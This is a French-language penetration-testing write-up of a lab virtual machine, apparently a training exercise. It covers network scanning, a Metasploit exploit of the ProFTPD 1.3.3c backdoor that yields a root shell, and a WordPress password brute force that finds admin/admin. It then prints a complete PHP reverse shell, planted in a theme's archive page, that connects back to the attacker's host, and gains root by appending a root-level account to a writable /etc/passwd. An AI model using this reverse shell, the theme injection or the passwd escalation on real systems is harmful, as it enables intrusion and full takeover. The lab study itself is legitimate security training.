# Analyse Basic PenTesting

## Recherche de la maichine sur le reseau :

```bash 
└─$ sudo nmap -sS 10.0.2.4/24
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 08:38 EDT
Nmap scan report for 10.0.2.1
Host is up (0.000043s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
53/tcp open  domain
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.2
Host is up (0.000079s latency).
Not shown: 999 closed tcp ports (reset)
PORT    STATE SERVICE
631/tcp open  ipp
MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)

Nmap scan report for 10.0.2.3
Host is up (0.000036s latency).
All 1000 scanned ports on 10.0.2.3 are in ignored states.
Not shown: 1000 filtered tcp ports (proto-unreach)
MAC Address: 08:00:27:3C:A7:51 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.5
Host is up (0.000088s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E9:28:C3 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.2.15
Host is up (0.0000030s latency).
All 1000 scanned ports on 10.0.2.15 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (5 hosts up) scanned in 4.46 seconds

```

Le bail DHCP attribué à la machine est `10.0.2.5`

## Annalyse des ports et versions des services

```bash
└─$ sudo nmap -sS 10.0.2.5 -p- -sV   
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-08 08:40 EDT
Nmap scan report for 10.0.2.5
Host is up (0.000088s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 08:00:27:E9:28:C3 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.44 seconds
```
### Ports ouverts

| Port  | Service | Version  | Vulnerable  | 
|---|---|---|---|
|  21  | FTP  | ProFTPD 1.3.3  | Oui |
|  22  | SSH  | OopenSSH 7.2p2  | Oui |
|  80  | web |Apache 2.4.18  |  Oui | 


***


## Analyse des fails

![](https://imgur.com/HTdCxtW.png) 

Il semble qu'une bonne partie des services soient vulnérables, il est possible d'identifier deux axes d'attaques : 

- l'un est lié à la version de ProFTPd 
- L'autre est lié à la version d'Openssh, qui permet une extraction des usernames puis une attaque par brute Force



***

## Analyse du service ProFTPd

```bash
msf6 > search OpenSSH

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  post/windows/manage/forward_pageant                           normal     No     Forward SSH Agent Requests To Remote Pageant
   1  post/windows/manage/install_ssh                               normal     No     Install OpenSSH for Windows
   2  post/multi/gather/ssh_creds                                   normal     No     Multi Gather OpenSSH PKI Credentials Collection
   3  auxiliary/scanner/ssh/ssh_enumusers                           normal     No     SSH Username Enumeration
   4  exploit/windows/local/unquoted_service_path  2001-10-25       excellent  Yes    Windows Unquoted Service Path Privilege Escalation


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/unquoted_service_path                                                                                                                 

msf6 > search ProFTPD 1.3.3c

Matching Modules
================

   #  Name                                    Disclosure Date  Rank       Check  Description
   -  ----                                    ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_133c_backdoor  2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_133c_backdoor

msf6 > use exploit/unix/ftp/proftpd_133c_backdoor 
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options 

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki
                                      /Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.5
RHOSTS => 10.0.2.5
   
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > show payloads 

Compatible Payloads
===================

   #  Name                                        Disclosure Date  Rank    Check  Description
   -  ----                                        ---------------  ----    -----  -----------
   0  payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1  payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   3  payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   4  payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   5  payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   6  payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   7  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > options

Module options (exploit/unix/ftp/proftpd_133c_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.0.2.5        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set LHOST 10.0.2.15
LHOST => 10.0.2.15
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 10.0.2.15:4444 
[-] 10.0.2.4:21 - Exploit failed [unreachable]: Rex::HostUnreachable The host (10.0.2.4:21) was unreachable.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > set RHOSTS 10.0.2.5
RHOSTS => 10.0.2.5
msf6 exploit(unix/ftp/proftpd_133c_backdoor) > exploit

[*] Started reverse TCP double handler on 10.0.2.15:4444 
[*] 10.0.2.5:21 - Sending Backdoor Command
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo 5lGEicxghImhKsF7;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "5lGEicxghImhKsF7\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.5:49544 ) at 2022-06-12 11:36:57 -0400

whoami
root
id
uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
```

Nous avons ici déjà un accès root 


## Analyse du Port 80 

Le port 80, semble contenir, un simple serveur WEB. 
Mais Dirb nous permet de détecter une site Wordprepss. 
Après résolution en local du nom de domaine pour la gestion des ressources de word Press. 

On arrive sur un blog wordpress, basic.

```bash
└─$ wpscan --url vtcsec/secret/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin


_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://vtcsec/secret/ [10.0.2.5]
[+] Started: Mon Jun 20 05:06:51 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://vtcsec/secret/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://vtcsec/secret/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://vtcsec/secret/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://vtcsec/secret/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.20 identified (Latest, released on 2022-03-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://vtcsec/secret/index.php/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>
 |  - http://vtcsec/secret/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.9.20</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://vtcsec/secret/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-05-24T00:00:00.000Z
 | Readme: http://vtcsec/secret/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://vtcsec/secret/wp-content/themes/twentyseventeen/style.css?ver=4.9.20, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - admin / admin                                                                                          
Trying admin / admin Time: 00:05:21 <                                    > (19820 / 14364212)  0.13%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: admin

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Jun 20 05:12:23 2022
[+] Requests Done: 19961
[+] Cached Requests: 37
[+] Data Sent: 10.042 MB
[+] Data Received: 70.163 MB
[+] Memory used: 284.465 MB
[+] Elapsed time: 00:05:31

```

Après analyse nous obtenons le couple `admin/admin`

Comme je n'ai pas envie d'utiliser Metasploit 2 fois je vais tenter une technique plus "manuelle", en réalisant une injection au travers des thèmes wordpress; 

Grâce au login admin, dans le thème wordpress nous allons glisser un reverse Shell. 

Le reverse shell est dans la page Archive

![](https://imgur.com/v6dyvEj.png) 


```PHP
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.0.2.15';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```


En lance un client Netcat du coté kali via 

```bash
nc -l -v -p 1234
```
et en chargant la page `http://vtcsec/secret/wp-content/themes/twentyseventeen/archive.php` 
j'obtiens la main sur un pseudo shell. 
Grâce à python je spawn un shell.

```python
import pty; pty.spawn('/bin/bash')
```

Les scripts `linpeas`, me permettent de détecter entre autres TRES nombreux vecteurs d'attaque, que le /etc/passwd est autorisé en écriture.

je l'utilise donc comme vecteur d'attaque : 
```bash
echo "root2:MlNmbwLb2K0bo:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Je passe en su de mon utilisateur `root2`

```bash
www-data@vtcsec:/tmp$ su root2
su root2
Password: root

root@vtcsec:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
``` 
![](https://imgur.com/aVt99nU.png) 

(Le screen ne date pas de quand j'ai fais la VM mais de la rédaction du rapport, les commandes passée dans le shell ne matches donc pas)

Et me voila root.

Il y'avait de nobreuses autres options notament : 
- Via le serveur SQL
- Via certaine librairie libre en écriture, 
- Via les crontabs
- Via le SSH (BRUTE FORCE)

##


 

